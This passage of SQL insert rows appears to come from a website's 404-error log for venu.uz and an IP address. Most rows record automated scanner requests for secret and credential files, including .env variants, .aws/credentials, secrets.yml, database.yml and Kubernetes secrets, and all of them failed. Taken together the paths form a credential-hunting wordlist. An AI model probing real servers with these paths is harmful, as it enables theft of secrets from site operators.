(654,404,'https://95.182.118.148/actuator/health',1,NULL,NULL,'2025-06-26 09:51:24','2025-06-26 09:51:24'),
(655,404,'https://95.182.118.148/sites/favicon.ico',1,NULL,NULL,'2025-06-26 10:39:43','2025-06-26 10:39:43'),
(656,404,'https://95.182.118.148/sites/favicon.png',1,NULL,NULL,'2025-06-26 10:39:48','2025-06-26 10:39:48'),
(657,404,'https://venu.uz/facebook.com',6,NULL,NULL,'2025-06-26 11:17:04','2025-07-11 04:09:00'),
(658,404,'https://venu.uz/info',3,NULL,NULL,'2025-06-26 12:18:43','2025-07-11 01:00:09'),
(659,404,'https://95.182.118.148/conf.env',1,NULL,NULL,'2025-06-26 12:49:02','2025-06-26 12:49:02'),
(660,404,'https://95.182.118.148/ses.env',1,NULL,NULL,'2025-06-26 12:49:03','2025-06-26 12:49:03'),
(661,404,'https://95.182.118.148/.env.pgsql',1,NULL,NULL,'2025-06-26 12:49:05','2025-06-26 12:49:05'),
(662,404,'https://95.182.118.148/.env-event',1,NULL,NULL,'2025-06-26 12:49:06','2025-06-26 12:49:06'),
(663,404,'https://95.182.118.148/.env-usage',1,NULL,NULL,'2025-06-26 12:49:07','2025-06-26 12:49:07'),
(664,404,'https://95.182.118.148/.env.bak.1',1,NULL,NULL,'2025-06-26 12:49:07','2025-06-26 12:49:07'),
(665,404,'https://95.182.118.148/.env.cache',1,NULL,NULL,'2025-06-26 12:49:09','2025-06-26 12:49:09'),
(666,404,'https://95.182.118.148/.env.netrc',1,NULL,NULL,'2025-06-26 12:49:10','2025-06-26 12:49:10'),
(667,404,'https://95.182.118.148/.env.old.1',1,NULL,NULL,'2025-06-26 12:49:12','2025-06-26 12:49:12'),
(668,404,'https://95.182.118.148/.env-trace',1,NULL,NULL,'2025-06-26 12:49:13','2025-06-26 12:49:13'),
(669,404,'https://95.182.118.148/.env-queue',1,NULL,NULL,'2025-06-26 12:49:14','2025-06-26 12:49:14'),
(670,404,'https://95.182.118.148/.env-token',1,NULL,NULL,'2025-06-26 12:49:15','2025-06-26 12:49:15'),
(671,404,'https://95.182.118.148/.env_panel',1,NULL,NULL,'2025-06-26 12:49:15','2025-06-26 12:49:15'),
(672,404,'https://95.182.118.148/.env-nginx',1,NULL,NULL,'2025-06-26 12:49:16','2025-06-26 12:49:16'),
(673,404,'https://95.182.118.148/.env.azure',1,NULL,NULL,'2025-06-26 12:49:17','2025-06-26 12:49:17'),
(674,404,'https://95.182.118.148/awstats.jsp',1,NULL,NULL,'2025-06-26 12:49:18','2025-06-26 12:49:18'),
(675,404,'https://95.182.118.148/aws_keys.py',1,NULL,NULL,'2025-06-26 12:49:19','2025-06-26 12:49:19'),
(676,404,'https://95.182.118.148/aws_keys.js',1,NULL,NULL,'2025-06-26 12:49:19','2025-06-26 12:49:19'),
(677,404,'https://95.182.118.148/.aws/konfig',1,NULL,NULL,'2025-06-26 12:49:21','2025-06-26 12:49:21'),
(678,404,'https://95.182.118.148/.aws/.s3cfg',1,NULL,NULL,'2025-06-26 12:49:22','2025-06-26 12:49:22'),
(679,404,'https://95.182.118.148/.aws/secret',1,NULL,NULL,'2025-06-26 12:49:23','2025-06-26 12:49:23'),
(680,404,'https://95.182.118.148/awstats.txt',1,NULL,NULL,'2025-06-26 12:49:24','2025-06-26 12:49:24'),
(681,404,'https://95.182.118.148/aws/s3.yaml',1,NULL,NULL,'2025-06-26 12:49:25','2025-06-26 12:49:25'),
(682,404,'https://95.182.118.148/painel/.env',1,NULL,NULL,'2025-06-26 12:49:27','2025-06-26 12:49:27'),
(683,404,'https://95.182.118.148/tmp/.env.db',1,NULL,NULL,'2025-06-26 12:49:27','2025-06-26 12:49:27'),
(684,404,'https://95.182.118.148/source/.env',1,NULL,NULL,'2025-06-26 12:49:28','2025-06-26 12:49:28'),
(685,404,'https://95.182.118.148/tmp/env.bak',1,NULL,NULL,'2025-06-26 12:49:29','2025-06-26 12:49:29'),
(686,404,'https://95.182.118.148/storage.env',1,NULL,NULL,'2025-06-26 12:49:31','2025-06-26 12:49:31'),
(687,404,'https://95.182.118.148/strapi/.env',1,NULL,NULL,'2025-06-26 12:49:32','2025-06-26 12:49:32'),
(688,404,'https://95.182.118.148/qa/.env.bak',1,NULL,NULL,'2025-06-26 12:49:33','2025-06-26 12:49:33'),
(689,404,'https://extraordinary-cleansing-ability-and-item-list.adq.ir/545-southeast-westwoods-drive',1,NULL,NULL,'2025-06-26 13:00:15','2025-06-26 13:00:15'),
(690,404,'https://extraordinary-cleansing-ability-and-item-list.adq.ir/ennis-emeana',1,NULL,NULL,'2025-06-26 13:00:17','2025-06-26 13:00:17'),
(691,404,'https://venu.uz/wujfo',1,NULL,NULL,'2025-06-27 05:22:59','2025-06-27 05:22:59'),
(692,404,'https://venu.uz/.env/.env',1,NULL,NULL,'2025-06-27 09:58:42','2025-06-27 09:58:42'),
(693,404,'https://venu.uz/.env/laravel/.env',1,NULL,NULL,'2025-06-27 09:59:01','2025-06-27 09:59:01'),
(694,404,'https://venu.uz/.env/api/.env',1,NULL,NULL,'2025-06-27 09:59:20','2025-06-27 09:59:20'),
(695,404,'https://venu.uz/.env/config.env',1,NULL,NULL,'2025-06-27 09:59:43','2025-06-27 09:59:43'),
(696,404,'https://venu.uz/.env/.env.production',1,NULL,NULL,'2025-06-27 10:00:02','2025-06-27 10:00:02'),
(697,404,'https://venu.uz/.env/public/.env',1,NULL,NULL,'2025-06-27 10:00:17','2025-06-27 10:00:17'),
(698,404,'https://venu.uz/.env/sendgrid/.env/.git/config',1,NULL,NULL,'2025-06-27 10:00:30','2025-06-27 10:00:30'),
(699,404,'https://venu.uz/config/.env',6,NULL,NULL,'2025-06-27 12:48:54','2025-07-11 01:00:38'),
(700,404,'https://venu.uz/contact',1,NULL,NULL,'2025-06-27 12:49:02','2025-06-27 12:49:02'),
(701,404,'https://venu.uz/.js',1,NULL,NULL,'2025-06-28 08:21:26','2025-06-28 08:21:26'),
(702,404,'https://venu.uz/admin/system-setup/language/translate/uz',5,NULL,NULL,'2025-06-28 10:13:31','2025-07-03 20:51:50'),
(703,404,'https://venu.uz//venu.uz/public/assets/front-end/vendor/lg-video.js/dist/lg-video.min.js',7,NULL,NULL,'2025-06-29 00:05:09','2025-07-06 07:11:30'),
(704,404,'https://venu.uz/@vite/env',1,NULL,NULL,'2025-06-29 11:05:49','2025-06-29 11:05:49'),
(705,404,'https://venu.uz/actuator/env',1,NULL,NULL,'2025-06-29 11:05:49','2025-06-29 11:05:49'),
(706,404,'https://venu.uz/server',1,NULL,NULL,'2025-06-29 11:05:50','2025-06-29 11:05:50'),
(707,404,'https://venu.uz/about',1,NULL,NULL,'2025-06-29 11:05:51','2025-06-29 11:05:51'),
(708,404,'https://venu.uz/debug/default/view?panel=config',1,NULL,NULL,'2025-06-29 11:05:52','2025-06-29 11:05:52'),
(709,404,'https://venu.uz/v2/_catalog',1,NULL,NULL,'2025-06-29 11:05:52','2025-06-29 11:05:52'),
(710,404,'https://venu.uz/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application',1,NULL,NULL,'2025-06-29 11:05:53','2025-06-29 11:05:53'),
(711,404,'https://venu.uz/login.action',1,NULL,NULL,'2025-06-29 11:05:54','2025-06-29 11:05:54'),
(712,404,'https://venu.uz/_all_dbs',1,NULL,NULL,'2025-06-29 11:05:55','2025-06-29 11:05:55'),
(713,404,'https://venu.uz/.DS_Store',2,NULL,NULL,'2025-06-29 11:05:55','2025-07-01 11:01:17'),
(714,404,'https://venu.uz/s/834313e2831313e2238313e25393/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties',1,NULL,NULL,'2025-06-29 11:05:56','2025-06-29 11:05:56'),
(715,404,'https://venu.uz/telescope/requests',1,NULL,NULL,'2025-06-29 11:05:57','2025-06-29 11:05:57'),
(716,404,'https://venu.uz/tel%3A%20%2B998905650213',1,NULL,NULL,'2025-06-29 23:38:14','2025-06-29 23:38:14'),
(717,404,'https://venu.uz/assets/img/media/form-bg.png',7,NULL,NULL,'2025-06-30 17:01:28','2025-07-08 16:00:10'),
(718,404,'https://venu.uz/admin/system-setup/language?offcanvasShow=offcanvasSetupGuide',2,NULL,NULL,'2025-06-30 17:01:43','2025-06-30 17:01:54'),
(719,404,'https://venu.uz/.env.backup',3,NULL,NULL,'2025-06-30 20:20:54','2025-07-11 01:00:13'),
(720,404,'https://venu.uz/etc/caddy/Caddyfile',1,NULL,NULL,'2025-06-30 20:31:32','2025-06-30 20:31:32'),
(721,404,'https://venu.uz/api/config/tsconfig.json',1,NULL,NULL,'2025-06-30 20:31:32','2025-06-30 20:31:32'),
(722,404,'https://venu.uz/test',1,NULL,NULL,'2025-06-30 20:31:33','2025-06-30 20:31:33'),
(723,404,'https://venu.uz/products/.gitlab-ci.yml',1,NULL,NULL,'2025-06-30 20:31:33','2025-06-30 20:31:33'),
(724,404,'https://venu.uz/docs/deployment.md',1,NULL,NULL,'2025-06-30 20:31:37','2025-06-30 20:31:37'),
(725,404,'https://venu.uz/index.php/phpinfo',1,NULL,NULL,'2025-06-30 20:31:37','2025-06-30 20:31:37'),
(726,404,'https://venu.uz/app/routes.py',1,NULL,NULL,'2025-06-30 20:31:38','2025-06-30 20:31:38'),
(727,404,'https://venu.uz/src/main/resources/appsettings.yml',1,NULL,NULL,'2025-06-30 20:31:39','2025-06-30 20:31:39'),
(728,404,'https://venu.uz/config/test.json',1,NULL,NULL,'2025-06-30 20:31:39','2025-06-30 20:31:39'),
(729,404,'https://venu.uz/debug/default',1,NULL,NULL,'2025-06-30 20:31:42','2025-06-30 20:31:42'),
(730,404,'https://venu.uz/frontend_dev.php/$',1,NULL,NULL,'2025-06-30 20:31:43','2025-06-30 20:31:43'),
(731,404,'https://venu.uz/config/services.yaml',1,NULL,NULL,'2025-06-30 20:31:46','2025-06-30 20:31:46'),
(732,404,'https://venu.uz/config/config.js',1,NULL,NULL,'2025-06-30 20:31:46','2025-06-30 20:31:46'),
(733,404,'https://venu.uz/.profile',1,NULL,NULL,'2025-06-30 20:31:47','2025-06-30 20:31:47'),
(734,404,'https://venu.uz/config/config.ini',1,NULL,NULL,'2025-06-30 20:31:47','2025-06-30 20:31:47'),
(735,404,'https://venu.uz/gulpfile.js',1,NULL,NULL,'2025-06-30 20:31:48','2025-06-30 20:31:48'),
(736,404,'https://venu.uz/settings.json',1,NULL,NULL,'2025-06-30 20:31:48','2025-06-30 20:31:48'),
(737,404,'https://venu.uz/config.properties',1,NULL,NULL,'2025-06-30 20:31:51','2025-06-30 20:31:51'),
(738,404,'https://venu.uz/js/config.js',1,NULL,NULL,'2025-06-30 20:31:52','2025-06-30 20:31:52'),
(739,404,'https://venu.uz/configs/application.ini',1,NULL,NULL,'2025-06-30 20:31:52','2025-06-30 20:31:52'),
(740,404,'https://venu.uz/config/aws.json',3,NULL,NULL,'2025-06-30 20:31:52','2025-07-11 01:00:46'),
(741,404,'https://venu.uz/manifest.json',1,NULL,NULL,'2025-06-30 20:31:53','2025-06-30 20:31:53'),
(742,404,'https://venu.uz/config/settings.py',1,NULL,NULL,'2025-06-30 20:31:53','2025-06-30 20:31:53'),
(743,404,'https://venu.uz/config.ini',2,NULL,NULL,'2025-06-30 20:31:54','2025-07-11 01:01:21'),
(744,404,'https://venu.uz/ecosystem.config.js',1,NULL,NULL,'2025-06-30 20:31:54','2025-06-30 20:31:54'),
(745,404,'https://venu.uz/src/main/resources/application.properties',1,NULL,NULL,'2025-06-30 20:31:55','2025-06-30 20:31:55'),
(746,404,'https://venu.uz/appsettings.Development.json',1,NULL,NULL,'2025-06-30 20:31:58','2025-06-30 20:31:58'),
(747,404,'https://venu.uz/k8s/deployment.yaml',1,NULL,NULL,'2025-06-30 20:31:58','2025-06-30 20:31:58'),
(748,404,'https://venu.uz/project/settings.py',1,NULL,NULL,'2025-06-30 20:31:59','2025-06-30 20:31:59'),
(749,404,'https://venu.uz/Dockerfile',1,NULL,NULL,'2025-06-30 20:31:59','2025-06-30 20:31:59'),
(750,404,'https://venu.uz/Program.cs',1,NULL,NULL,'2025-06-30 20:31:59','2025-06-30 20:31:59'),
(751,404,'https://venu.uz/app.config.js',1,NULL,NULL,'2025-06-30 20:32:00','2025-06-30 20:32:00'),
(752,404,'https://venu.uz/config/default.json',1,NULL,NULL,'2025-06-30 20:32:00','2025-06-30 20:32:00'),
(753,404,'https://venu.uz/config/development.yaml',1,NULL,NULL,'2025-06-30 20:32:01','2025-06-30 20:32:01'),
(754,404,'https://venu.uz/src/config/environment.js',1,NULL,NULL,'2025-06-30 20:32:02','2025-06-30 20:32:02'),
(755,404,'https://venu.uz/.flaskenv',2,NULL,NULL,'2025-06-30 20:32:02','2025-07-11 01:00:33'),
(756,404,'https://venu.uz/config/config.yaml',1,NULL,NULL,'2025-06-30 20:32:02','2025-06-30 20:32:02'),
(757,404,'https://venu.uz/config/application.rb',1,NULL,NULL,'2025-06-30 20:32:03','2025-06-30 20:32:03'),
(758,404,'https://venu.uz/config/environments/production.rb',1,NULL,NULL,'2025-06-30 20:32:04','2025-06-30 20:32:04'),
(759,404,'https://venu.uz/config/environments/development.rb',1,NULL,NULL,'2025-06-30 20:32:04','2025-06-30 20:32:04'),
(760,404,'https://venu.uz/config/initializers/devise.rb',1,NULL,NULL,'2025-06-30 20:32:04','2025-06-30 20:32:04'),
(761,404,'https://venu.uz/config/database.yml',2,NULL,NULL,'2025-06-30 20:32:05','2025-07-11 01:00:59'),
(762,404,'https://venu.uz/config/secrets.yml',1,NULL,NULL,'2025-06-30 20:32:05','2025-06-30 20:32:05'),
(763,404,'https://venu.uz/config/config.yml',1,NULL,NULL,'2025-06-30 20:32:08','2025-06-30 20:32:08'),
(764,404,'https://venu.uz/config/packages/prod/doctrine.yaml',1,NULL,NULL,'2025-06-30 20:32:08','2025-06-30 20:32:08'),
(765,404,'https://venu.uz/src/main/resources/application.yml',1,NULL,NULL,'2025-06-30 20:32:08','2025-06-30 20:32:08'),
(766,404,'https://venu.uz/src/main/resources/application-dev.properties',1,NULL,NULL,'2025-06-30 20:32:09','2025-06-30 20:32:09'),
(767,404,'https://venu.uz/src/main/resources/application-prod.properties',1,NULL,NULL,'2025-06-30 20:32:09','2025-06-30 20:32:09'),
(768,404,'https://venu.uz/config/applicationContext.xml',1,NULL,NULL,'2025-06-30 20:32:11','2025-06-30 20:32:11'),
(769,404,'https://venu.uz/appsettings.Production.json',1,NULL,NULL,'2025-06-30 20:32:11','2025-06-30 20:32:11'),
(770,404,'https://venu.uz/secrets/appsettings.json',1,NULL,NULL,'2025-06-30 20:32:12','2025-06-30 20:32:12'),
(771,404,'https://venu.uz/config/config.go',1,NULL,NULL,'2025-06-30 20:32:13','2025-06-30 20:32:13'),
(772,404,'https://venu.uz/src/config/config.yaml',1,NULL,NULL,'2025-06-30 20:32:13','2025-06-30 20:32:13'),
(773,404,'https://venu.uz/src/config/config.json',1,NULL,NULL,'2025-06-30 20:32:13','2025-06-30 20:32:13'),
(774,404,'https://venu.uz/config/app.yaml',1,NULL,NULL,'2025-06-30 20:32:14','2025-06-30 20:32:14'),
(775,404,'https://venu.uz/Config.plist',1,NULL,NULL,'2025-06-30 20:32:14','2025-06-30 20:32:14'),
(776,404,'https://venu.uz/Info.plist',1,NULL,NULL,'2025-06-30 20:32:15','2025-06-30 20:32:15'),
(777,404,'https://venu.uz/Environment.xcconfig',1,NULL,NULL,'2025-06-30 20:32:17','2025-06-30 20:32:17'),
(778,404,'https://venu.uz/Config.xcconfig',1,NULL,NULL,'2025-06-30 20:32:17','2025-06-30 20:32:17'),
(779,404,'https://venu.uz/App/Config.swift',1,NULL,NULL,'2025-06-30 20:32:18','2025-06-30 20:32:18'),
(780,404,'https://venu.uz/App/Info.plist',1,NULL,NULL,'2025-06-30 20:32:18','2025-06-30 20:32:18'),
(781,404,'https://venu.uz/src/main/java/com/example/config/Config.kt',1,NULL,NULL,'2025-06-30 20:32:21','2025-06-30 20:32:21'),
(782,404,'https://venu.uz/local.properties',1,NULL,NULL,'2025-06-30 20:32:22','2025-06-30 20:32:22'),
(783,404,'https://venu.uz/src/main/assets/config.json',1,NULL,NULL,'2025-06-30 20:32:22','2025-06-30 20:32:22'),
(784,404,'https://venu.uz/config/config.exs',1,NULL,NULL,'2025-06-30 20:32:22','2025-06-30 20:32:22'),
(785,404,'https://venu.uz/config/prod.exs',1,NULL,NULL,'2025-06-30 20:32:23','2025-06-30 20:32:23'),
(786,404,'https://venu.uz/config/dev.exs',1,NULL,NULL,'2025-06-30 20:32:23','2025-06-30 20:32:23'),
(787,404,'https://venu.uz/config/runtime.exs',1,NULL,NULL,'2025-06-30 20:32:25','2025-06-30 20:32:25'),
(788,404,'https://venu.uz/config/releases.exs',1,NULL,NULL,'2025-06-30 20:32:27','2025-06-30 20:32:27'),
(789,404,'https://venu.uz/Rocket.toml',1,NULL,NULL,'2025-06-30 20:32:28','2025-06-30 20:32:28'),
(790,404,'https://venu.uz/config/Config.toml',1,NULL,NULL,'2025-06-30 20:32:28','2025-06-30 20:32:28'),
(791,404,'https://venu.uz/src/config.rs',1,NULL,NULL,'2025-06-30 20:32:28','2025-06-30 20:32:28'),
(792,404,'https://venu.uz/environments/development.yml',1,NULL,NULL,'2025-06-30 20:32:29','2025-06-30 20:32:29'),
(793,404,'https://venu.uz/environments/production.yml',1,NULL,NULL,'2025-06-30 20:32:30','2025-06-30 20:32:30'),
(794,404,'https://venu.uz/app.pl',1,NULL,NULL,'2025-06-30 20:32:30','2025-06-30 20:32:30'),
(795,404,'https://venu.uz/bin/app.pl',1,NULL,NULL,'2025-06-30 20:32:32','2025-06-30 20:32:32'),
(796,404,'https://venu.uz/conf/application.conf',1,NULL,NULL,'2025-06-30 20:32:32','2025-06-30 20:32:32'),
(797,404,'https://venu.uz/conf/development.conf',1,NULL,NULL,'2025-06-30 20:32:33','2025-06-30 20:32:33'),
(798,404,'https://venu.uz/conf/production.conf',1,NULL,NULL,'2025-06-30 20:32:33','2025-06-30 20:32:33'),
(799,404,'https://venu.uz/build.sbt',1,NULL,NULL,'2025-06-30 20:32:34','2025-06-30 20:32:34'),
(800,404,'https://venu.uz/project/plugins.sbt',1,NULL,NULL,'2025-06-30 20:32:34','2025-06-30 20:32:34'),
(801,404,'https://venu.uz/src/config.clj',1,NULL,NULL,'2025-06-30 20:32:34','2025-06-30 20:32:34'),
(802,404,'https://venu.uz/.lein-env',1,NULL,NULL,'2025-06-30 20:32:35','2025-06-30 20:32:35'),
(803,404,'https://venu.uz/project.clj',1,NULL,NULL,'2025-06-30 20:32:37','2025-06-30 20:32:37'),
(804,404,'https://venu.uz/config/config.jl',1,NULL,NULL,'2025-06-30 20:32:39','2025-06-30 20:32:39'),
(805,404,'https://venu.uz/config/development.jl',1,NULL,NULL,'2025-06-30 20:32:40','2025-06-30 20:32:40'),
(806,404,'https://venu.uz/config/production.jl',1,NULL,NULL,'2025-06-30 20:32:40','2025-06-30 20:32:40'),
(807,404,'https://venu.uz/config/routes.jl',1,NULL,NULL,'2025-06-30 20:32:40','2025-06-30 20:32:40'),
(808,404,'https://venu.uz/config/database.jl',1,NULL,NULL,'2025-06-30 20:32:41','2025-06-30 20:32:41'),
(809,404,'https://venu.uz/src/config.ml',1,NULL,NULL,'2025-06-30 20:32:43','2025-06-30 20:32:43'),
(810,404,'https://venu.uz/src/server/server.ml',1,NULL,NULL,'2025-06-30 20:32:43','2025-06-30 20:32:43'),
(811,404,'https://venu.uz/config/sys.config',1,NULL,NULL,'2025-06-30 20:32:44','2025-06-30 20:32:44'),
(812,404,'https://venu.uz/rel/sys.config',1,NULL,NULL,'2025-06-30 20:32:44','2025-06-30 20:32:44'),
(813,404,'https://venu.uz/rel/vm.args',1,NULL,NULL,'2025-06-30 20:32:44','2025-06-30 20:32:44'),
(814,404,'https://venu.uz/config/application.cr',1,NULL,NULL,'2025-06-30 20:32:45','2025-06-30 20:32:45'),
(815,404,'https://venu.uz/config/config.cr',1,NULL,NULL,'2025-06-30 20:32:45','2025-06-30 20:32:45'),
(816,404,'https://venu.uz/config/development.cr',1,NULL,NULL,'2025-06-30 20:32:45','2025-06-30 20:32:45'),
(817,404,'https://venu.uz/config/production.cr',1,NULL,NULL,'2025-06-30 20:32:46','2025-06-30 20:32:46'),
(818,404,'https://venu.uz/config/routes.cr',1,NULL,NULL,'2025-06-30 20:32:46','2025-06-30 20:32:46'),
(819,404,'https://venu.uz/config.nim',1,NULL,NULL,'2025-06-30 20:32:47','2025-06-30 20:32:47'),
(820,404,'https://venu.uz/config/development.nim',1,NULL,NULL,'2025-06-30 20:32:47','2025-06-30 20:32:47'),
(821,404,'https://venu.uz/config/production.nim',1,NULL,NULL,'2025-06-30 20:32:49','2025-06-30 20:32:49'),
(822,404,'https://venu.uz/src/config.nim',1,NULL,NULL,'2025-06-30 20:32:52','2025-06-30 20:32:52'),
(823,404,'https://venu.uz/src/routes.nim',1,NULL,NULL,'2025-06-30 20:32:52','2025-06-30 20:32:52'),
(824,404,'https://venu.uz/global.R',1,NULL,NULL,'2025-06-30 20:32:53','2025-06-30 20:32:53'),
(825,404,'https://venu.uz/server.R',1,NULL,NULL,'2025-06-30 20:32:53','2025-06-30 20:32:53'),
(826,404,'https://venu.uz/ui.R',1,NULL,NULL,'2025-06-30 20:32:53','2025-06-30 20:32:53'),
(827,404,'https://venu.uz/config.R',1,NULL,NULL,'2025-06-30 20:32:54','2025-06-30 20:32:54'),
(828,404,'https://venu.uz/app.R',1,NULL,NULL,'2025-06-30 20:32:54','2025-06-30 20:32:54'),
(829,404,'https://venu.uz/config.m',1,NULL,NULL,'2025-06-30 20:32:55','2025-06-30 20:32:55'),
(830,404,'https://venu.uz/config.f90',1,NULL,NULL,'2025-06-30 20:32:57','2025-06-30 20:32:57'),
(831,404,'https://venu.uz/config.cbl',1,NULL,NULL,'2025-06-30 20:32:59','2025-06-30 20:32:59'),
(832,404,'https://venu.uz/Sources/App/configure.swift',1,NULL,NULL,'2025-06-30 20:33:00','2025-06-30 20:33:00'),
(833,404,'https://venu.uz/Sources/App/routes.swift',1,NULL,NULL,'2025-06-30 20:33:00','2025-06-30 20:33:00'),
(834,404,'https://venu.uz/Resources/Config',1,NULL,NULL,'2025-06-30 20:33:01','2025-06-30 20:33:01'),
(835,404,'https://venu.uz/pubspec.yaml',1,NULL,NULL,'2025-06-30 20:33:01','2025-06-30 20:33:01'),
(836,404,'https://venu.uz/config.dart',1,NULL,NULL,'2025-06-30 20:33:01','2025-06-30 20:33:01'),
(837,404,'https://venu.uz/src/main.rs',1,NULL,NULL,'2025-06-30 20:33:02','2025-06-30 20:33:02'),
(838,404,'https://venu.uz/Application.cfc',1,NULL,NULL,'2025-06-30 20:33:02','2025-06-30 20:33:02'),
(839,404,'https://venu.uz/Application.cfm',1,NULL,NULL,'2025-06-30 20:33:03','2025-06-30 20:33:03'),
(840,404,'https://venu.uz/config/config.cfc',1,NULL,NULL,'2025-06-30 20:33:03','2025-06-30 20:33:03'),
(841,404,'https://venu.uz/config/settings.cfc',1,NULL,NULL,'2025-06-30 20:33:03','2025-06-30 20:33:03'),
(842,404,'https://venu.uz/config/environment.cfc',1,NULL,NULL,'2025-06-30 20:33:04','2025-06-30 20:33:04'),
(843,404,'https://venu.uz/.cfconfig.json',1,NULL,NULL,'2025-06-30 20:33:04','2025-06-30 20:33:04'),
(844,404,'https://venu.uz/config.lua',1,NULL,NULL,'2025-06-30 20:33:05','2025-06-30 20:33:05'),
(845,404,'https://venu.uz/config/application.lua',1,NULL,NULL,'2025-06-30 20:33:05','2025-06-30 20:33:05'),
(846,404,'https://venu.uz/config/development.lua',1,NULL,NULL,'2025-06-30 20:33:05','2025-06-30 20:33:05'),
(847,404,'https://venu.uz/config/production.lua',1,NULL,NULL,'2025-06-30 20:33:06','2025-06-30 20:33:06'),
(848,404,'https://venu.uz/config/routes.lua',1,NULL,NULL,'2025-06-30 20:33:06','2025-06-30 20:33:06'),
(849,404,'https://venu.uz/config/db.lua',1,NULL,NULL,'2025-06-30 20:33:06','2025-06-30 20:33:06'),
(850,404,'https://venu.uz/grails-app/conf/application.yml',1,NULL,NULL,'2025-06-30 20:33:07','2025-06-30 20:33:07'),
(851,404,'https://venu.uz/grails-app/conf/application.groovy',1,NULL,NULL,'2025-06-30 20:33:07','2025-06-30 20:33:07'),
(852,404,'https://venu.uz/grails-app/conf/application.properties',1,NULL,NULL,'2025-06-30 20:33:08','2025-06-30 20:33:08'),
(853,404,'https://venu.uz/grails-app/conf/logback.groovy',1,NULL,NULL,'2025-06-30 20:33:08','2025-06-30 20:33:08'),
(854,404,'https://venu.uz/grails-app/conf/bootstrap.groovy',1,NULL,NULL,'2025-06-30 20:33:09','2025-06-30 20:33:09'),
(855,404,'https://venu.uz/.ebextensions/myconfig.config',1,NULL,NULL,'2025-06-30 20:33:09','2025-06-30 20:33:09'),
(856,404,'https://venu.uz/cloudformation/template.yaml',1,NULL,NULL,'2025-06-30 20:33:09','2025-06-30 20:33:09'),
(857,404,'https://venu.uz/cloudformation/template.json',1,NULL,NULL,'2025-06-30 20:33:10','2025-06-30 20:33:10'),
(858,404,'https://venu.uz/appspec.yml',1,NULL,NULL,'2025-06-30 20:33:12','2025-06-30 20:33:12'),
(859,404,'https://venu.uz/scripts/install_dependencies.sh',1,NULL,NULL,'2025-06-30 20:33:12','2025-06-30 20:33:12'),
(860,404,'https://venu.uz/scripts/start_server.sh',1,NULL,NULL,'2025-06-30 20:33:14','2025-06-30 20:33:14'),
(861,404,'https://venu.uz/apprunner.yaml',1,NULL,NULL,'2025-06-30 20:33:15','2025-06-30 20:33:15'),
(862,404,'https://venu.uz/localstack/config.json',1,NULL,NULL,'2025-06-30 20:33:15','2025-06-30 20:33:15'),
(863,404,'https://venu.uz/meshes/mesh_config.json',1,NULL,NULL,'2025-06-30 20:33:16','2025-06-30 20:33:16'),
(864,404,'https://venu.uz/stepfunctions/state-machine-definition.json',1,NULL,NULL,'2025-06-30 20:33:16','2025-06-30 20:33:16'),
(865,404,'https://venu.uz/stepfunctions/state-machine-definition.yaml',1,NULL,NULL,'2025-06-30 20:33:16','2025-06-30 20:33:16'),
(866,404,'https://venu.uz/lambda_function.py',1,NULL,NULL,'2025-06-30 20:33:19','2025-06-30 20:33:19'),
(867,404,'https://venu.uz/etc/environment',1,NULL,NULL,'2025-06-30 20:33:22','2025-06-30 20:33:22'),
(868,404,'https://venu.uz/etc/profile.d',1,NULL,NULL,'2025-06-30 20:33:22','2025-06-30 20:33:22'),
(869,404,'https://venu.uz/home/ec2-user/.bashrc',1,NULL,NULL,'2025-06-30 20:33:23','2025-06-30 20:33:23'),
(870,404,'https://venu.uz/home/ec2-user/.aws/credentials',1,NULL,NULL,'2025-06-30 20:33:23','2025-06-30 20:33:23'),
(871,404,'https://venu.uz/home/ec2-user/.aws/config',1,NULL,NULL,'2025-06-30 20:33:24','2025-06-30 20:33:24'),
(872,404,'https://venu.uz/ecs-params.yml',1,NULL,NULL,'2025-06-30 20:33:24','2025-06-30 20:33:24'),
(873,404,'https://venu.uz/ebextensions.config',1,NULL,NULL,'2025-06-30 20:33:26','2025-06-30 20:33:26'),
(874,404,'https://venu.uz/.elasticbeanstalk/config.yml',1,NULL,NULL,'2025-06-30 20:33:26','2025-06-30 20:33:26'),
(875,404,'https://venu.uz/bucket-name/config/config.json',1,NULL,NULL,'2025-06-30 20:33:27','2025-06-30 20:33:27'),
(876,404,'https://venu.uz/bucket-name/config/config.yaml',1,NULL,NULL,'2025-06-30 20:33:27','2025-06-30 20:33:27'),
(877,404,'https://venu.uz/bucket-name/config/.env',1,NULL,NULL,'2025-06-30 20:33:28','2025-06-30 20:33:28'),
(878,404,'https://venu.uz/CloudFormation',1,NULL,NULL,'2025-06-30 20:33:28','2025-06-30 20:33:28'),
(879,404,'https://venu.uz/cloudformation-template.json',1,NULL,NULL,'2025-06-30 20:33:29','2025-06-30 20:33:29'),
(880,404,'https://venu.uz/cloudformation-template.yaml',1,NULL,NULL,'2025-06-30 20:33:30','2025-06-30 20:33:30'),
(881,404,'https://venu.uz/kubernetes/deployment.yaml',1,NULL,NULL,'2025-06-30 20:33:30','2025-06-30 20:33:30'),
(882,404,'https://venu.uz/kubernetes/service.yaml',1,NULL,NULL,'2025-06-30 20:33:30','2025-06-30 20:33:30'),
(883,404,'https://venu.uz/kubernetes/configmap.yaml',1,NULL,NULL,'2025-06-30 20:33:31','2025-06-30 20:33:31'),
(884,404,'https://venu.uz/kubernetes/secrets.yaml',1,NULL,NULL,'2025-06-30 20:33:31','2025-06-30 20:33:31'),
(885,404,'https://venu.uz/amplify/.config/project-config.json',1,NULL,NULL,'2025-06-30 20:33:32','2025-06-30 20:33:32'),
(886,404,'https://venu.uz/amplify/backend/config.json',1,NULL,NULL,'2025-06-30 20:33:32','2025-06-30 20:33:32'),
(887,404,'https://venu.uz/amplify/backend/environment-parameters.json',1,NULL,NULL,'2025-06-30 20:33:32','2025-06-30 20:33:32'),
(888,404,'https://venu.uz/src/aws-exports.js',1,NULL,NULL,'2025-06-30 20:33:33','2025-06-30 20:33:33'),
(889,404,'https://venu.uz/bin/app.ts',1,NULL,NULL,'2025-06-30 20:33:33','2025-06-30 20:33:33'),
(890,404,'https://venu.uz/lib/my-stack.ts',1,NULL,NULL,'2025-06-30 20:33:34','2025-06-30 20:33:34'),
(891,404,'https://venu.uz/cdk.json',1,NULL,NULL,'2025-06-30 20:33:34','2025-06-30 20:33:34'),
(892,404,'https://venu.uz/serverless.yml',1,NULL,NULL,'2025-06-30 20:33:34','2025-06-30 20:33:34'),
(893,404,'https://venu.uz/Terraform',1,NULL,NULL,'2025-06-30 20:33:35','2025-06-30 20:33:35'),
